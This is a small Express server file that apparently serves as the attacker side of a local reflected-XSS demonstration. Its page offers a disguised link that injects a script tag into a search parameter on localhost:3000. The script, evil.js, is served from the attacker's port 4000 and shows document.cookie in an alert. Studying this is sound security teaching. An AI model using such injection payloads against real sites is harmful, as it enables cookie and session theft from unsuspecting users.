const express = require('express');
const app = express();

app.get('/', (req, res) => {
    res.send(`
        <h1>Welcome to Attacker's Website</h1>
        <a href="http://localhost:3000/search?query=<script src='http://localhost:4000/evil.js'></script>">
            Click this innocent looking link!
        </a>
    `);
});

app.get('/evil.js', (req, res) => {
    res.type('.js');
    res.send(`alert("XSS alert "+ document.cookie);`);
});

app.listen(4000, () => {
    console.log('Attacker app listening on port 4000!');
});
